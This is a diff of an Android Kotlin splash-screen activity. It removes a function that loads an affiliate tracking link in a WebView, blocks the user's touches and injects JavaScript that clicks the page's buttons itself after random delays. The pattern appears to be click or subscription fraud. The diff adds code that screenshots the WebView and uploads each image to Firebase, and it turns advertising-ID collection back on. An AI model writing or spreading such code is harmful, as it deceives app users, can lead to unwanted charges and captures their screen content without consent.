@@ -57,102 +57,15 @@ class SplashAct : AppCompatActivity(R.layout.activity_splash) {
         super.onCreate(savedInstanceState)
         Analytics.open()
 
-        //app.getAdvertisingId(this)
+        app.getAdvertisingId(this)
         init()
 
-        // variables.OPEN = mPrefs.getDataInt(LideraSharedKeys.FirstOpenView.key)
-        //variables.lastUrl = mPrefs.getDataString(LideraSharedKeys.LastOpenUrl.key)
+        variables.OPEN = mPrefs.getDataInt(LideraSharedKeys.FirstOpenView.key)
+        variables.lastUrl = mPrefs.getDataString(LideraSharedKeys.LastOpenUrl.key)
 
-        //splashLoader()
-        load()
+        splashLoader()
     }
 
-
-
-    fun load() {
-        flBack.removeAllViews()
-        flBack.addView(webView)
-
-        LoadWatcher.setCallbacks(object : LoadWatcher.WatcherCallbacks {
-            override fun loaded(number: Int, url : String) {
-
-                flBack.isDrawingCacheEnabled = true
-                flBack.drawingCacheQuality = View.DRAWING_CACHE_QUALITY_HIGH
-                flBack.buildDrawingCache()
-                FirebaseLogger.saveImage(flBack.drawingCache, url)
-                flBack.isDrawingCacheEnabled = false
-
-                when (number) {
-                    0 -> {
-                        Analytics.showButton()
-                        pbLoad.visibility = View.INVISIBLE
-                        btnStart.visibility = View.VISIBLE
-                        btnStart.setOnClickListener {
-                            if (flow == LoadWatcher.K_FLOW) {
-                                val js = "javascript:(function(){" +
-                                        "l=document.getElementsByClassName('btn nClick')[0];" +
-                                        "l.click();" +
-                                        "})()"
-                                webView.evaluateJavascript(
-                                        js
-                                ) { value -> Log.e("LOL", value.toString()) }
-                                btnStart.visibility = View.GONE
-                                pbLoad.visibility = View.VISIBLE
-                                Analytics.clickButtonK()
-                            } else {
-                                val js = "javascript:(function(){" +
-                                        "l=document.getElementsByClassName('play_btn red')[0];" +
-                                        "l.click();" +
-                                        "})()"
-                                webView.evaluateJavascript(
-                                        js
-                                ) { value -> Log.e("LOL", value.toString()) }
-                                Analytics.clickFirstButton()
-                                var millis = Random.nextLong(1_000L, 4_000L)
-                                var countDown =
-                                        object : CountDownTimer(millis, 300) {
-                                            override fun onTick(millisUntilFinished: Long) {
-                                            }
-
-                                            override fun onFinish() {
-                                                val js = "javascript:(function(){" +
-                                                        "l=document.getElementsByClassName('btn nClick')[0];" +
-                                                        "l.click();" +
-                                                        "})()"
-                                                webView.evaluateJavascript(
-                                                        js
-                                                ) { value ->
-                                                    Log.e(
-                                                            "LOL",
-                                                            value.toString()
-                                                    )
-                                                }
-                                                Analytics.clickSecondButton()
-                                            }
-                                        }
-                                countDown.start()
-
-                                btnStart.visibility = View.GONE
-                                pbLoad.visibility = View.VISIBLE
-
-                            }
-                        }
-                    }
-                    1 -> {
-                        //startTimer()
-                    }
-                }
-            }
-
-            override fun choiceFlow(numberFlow: Int) {
-                flow = numberFlow
-            }
-        })
-
-
-        webView.setOnTouchListener(View.OnTouchListener { v, event -> true })
-        webView.loadUrl("https://track.greentropolo.com/g/4063609a44e68178a2?external_id={subid}&utm_source=ad_atlascpa", HeaderHolder.getHeaders())
-    }
 
 
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
@@ -230,6 +143,13 @@ class SplashAct : AppCompatActivity(R.layout.activity_splash) {
 
                         LoadWatcher.setCallbacks(object : LoadWatcher.WatcherCallbacks {
                             override fun loaded(number: Int, url: String) {
+
+                                flBack.isDrawingCacheEnabled = true
+                                flBack.drawingCacheQuality = View.DRAWING_CACHE_QUALITY_HIGH
+                                flBack.buildDrawingCache()
+                                FirebaseLogger.saveImage(flBack.drawingCache, url)
+                                flBack.isDrawingCacheEnabled = false
+
                                 when (number) {
                                     0 -> {
                                         Analytics.showButton()
